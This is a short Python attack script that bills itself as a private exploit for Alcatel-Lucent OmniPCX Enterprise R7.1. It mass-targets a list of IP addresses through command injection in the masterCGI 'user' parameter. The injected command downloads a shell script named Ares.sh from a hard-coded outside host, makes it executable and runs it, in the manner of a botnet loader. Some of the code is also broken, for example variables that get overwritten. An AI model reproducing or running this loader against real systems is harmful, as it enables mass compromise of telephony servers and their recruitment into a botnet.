#!/usr/bin/env python
# -*- coding: utf-8 -*- 
# Alcatel-Lucent OmniPCX Enterprise R7.1 Exploit made by B4CKDOOR - FULL PRIVATE #
# B4CKDOORARCHIVE.HOST #

import threading, random, socket, time, sys, requests, re, os, subprocess

if len(sys.argv) < 3:
	print "\033[37mUsage: python "+sys.argv[0]+" <list> <port>\033[37m"
	sys.exit()

ip = "40.115.58.61" # BINS LOCATION IP
vulns = open(sys.argv[1], "r").readlines()
port = int(sys.argv[2]) # PORTS httpd / 443 add ssl
class send_payload(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		try:
			url = "http://" + self.ip + ":"+port+"/cgi-bin/masterCGI?ping=nomip&user=;wget http://" + ip + "/Ares.sh; curl -O http://" + ip + "/Ares.sh; chmod +x Ares.sh; ./Ares.sh"
			requests.get(url, timeout=8)
			print "[Alcatel-L] Loading: %s"%(self.ip)
		except:
			pass

for IP in vulns:
	try:
		ip = "".join(IP)
		ip = ip.replace("\n", "")
		t = send_payload(ip)
		t.start()
		time.sleep(0.03)
	except:
		pass #CODED BY B4CKDOOR